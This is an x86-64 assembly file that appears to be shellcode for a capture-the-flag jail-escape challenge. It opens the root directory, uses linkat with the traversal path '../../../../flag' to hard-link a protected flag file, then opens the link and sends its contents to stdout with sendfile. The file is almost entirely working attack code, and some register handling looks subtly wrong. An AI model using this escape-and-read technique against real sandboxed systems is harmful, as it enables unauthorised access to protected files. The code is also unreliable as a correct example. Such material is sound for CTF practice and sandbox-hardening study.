.global _start

_start: 
 # open file
 mov $2, %rax
 lea jail_root(%rip), %rdi
 xor %rsi, %rsi
 xor %rdx, %rdx
 syscall

 # linkat syscall
 mov %rax, %rdx
 mov $265, %rax
 mov $3, %rdi
 lea old_flag(%rip), %rsi
 lea new_flag(%rip), %r10
 xor %r8, %r8
 syscall

 # open file
 mov $2, %rax
 lea new_flag(%rip), %rdi
 xor %rsi, %rsi
 xor %rdx, %rdx
 syscall

 # sendfile to stdout (fd=1)
 mov $1, %rdi
 mov %rax, %rsi
 xor %rdx, %rdx
 mov $0x1000, %r10
 mov $40, %al
 syscall

 # exit
 mov $60, %al
 xor %rdi, %rdi
 syscall
jail_root:
  .string "/"
old_flag:
  .string "../../../../flag"
new_flag:
  .string "flag1"